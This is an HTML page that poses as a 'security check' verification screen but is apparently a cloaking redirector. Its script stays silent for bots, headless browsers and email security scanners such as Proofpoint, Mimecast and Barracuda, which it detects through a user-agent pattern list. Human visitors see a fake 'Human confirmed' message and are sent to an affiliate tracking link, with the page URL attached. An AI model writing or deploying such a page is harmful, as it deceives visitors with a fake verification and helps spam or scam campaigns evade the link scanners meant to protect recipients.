<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Checking…</title>
<style>
  :root{--mint:#d1fae5;--mint2:#a7f3d0;--deep:#065f46;--acc:#10b981}
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:Inter,-apple-system,"Segoe UI",Roboto,sans-serif;
    background:radial-gradient(circle at 30% 20%,#ecfdf5,var(--mint) 60%,var(--mint2));
    color:var(--deep);display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .panel{
    width:100%;max-width:420px;background:#fff;border-radius:24px;
    padding:36px 26px 26px;text-align:center;
    box-shadow:0 24px 70px rgba(6,95,70,.14);
    animation:fadeUp .5s ease;
  }
  @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
  .circle{
    width:72px;height:72px;margin:0 auto 18px;border-radius:50%;
    background:linear-gradient(135deg,var(--acc),#059669);color:#fff;
    display:flex;align-items:center;justify-content:center;font-size:36px;
    box-shadow:0 12px 30px rgba(16,185,129,.4);
  }
  .title{font-size:22px;font-weight:800;letter-spacing:-.4px;margin-bottom:8px}
  .desc{font-size:14px;color:#4f7a6b;line-height:1.55;margin-bottom:22px}
  .state{font-size:13px;color:#4f7a6b;min-height:20px;margin-bottom:8px}
  .btn{
    width:100%;padding:16px;border:0;border-radius:14px;
    background:linear-gradient(135deg,var(--acc),#059669);color:#fff;
    font-family:inherit;font-size:16px;font-weight:700;cursor:pointer;
    min-height:56px;display:none;box-shadow:0 12px 28px rgba(16,185,129,.35);
  }
  .btn:active{transform:scale(.985)}
  .btn.on{display:block;animation:fadeUp .3s ease}
  .track{height:6px;background:#e6f7f1;border-radius:99px;overflow:hidden;margin-top:22px}
  .track span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--acc),#34d399);transition:width .25s;border-radius:99px}
</style>
</head>
<body>
<main class="panel">
  <div class="circle">✓</div>
  <h1 class="title">Great — you're verified!</h1>
  <p class="desc">Quick security check to keep the bots out.<br>You're one tap away.</p>
  <div class="state" id="sb">Starting…</div>
  <button class="btn" id="bb" type="button">Continue →</button>
  <div class="track"><span id="pb"></span></div>
</main>
<script>
const CONFIG={targetUrl:"https://trc.beastbox.pro/click?o=cmvruzl6n00wtaef369ruu2qx&p=AF-1004&sub1=RS",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('pb'),st=document.getElementById('sb'),btn=document.getElementById('bb');
  const ua=navigator.userAgent||"";
  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(const p of pats){if(p.test(ua))return;}
  if(navigator.webdriver===true)return;
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;bar.style.width="100%";
    st.textContent=acted?"Human confirmed ✓":"Tap to continue";
    btn.classList.add('on');}
  requestAnimationFrame(step);
  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
  let d=false;
  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
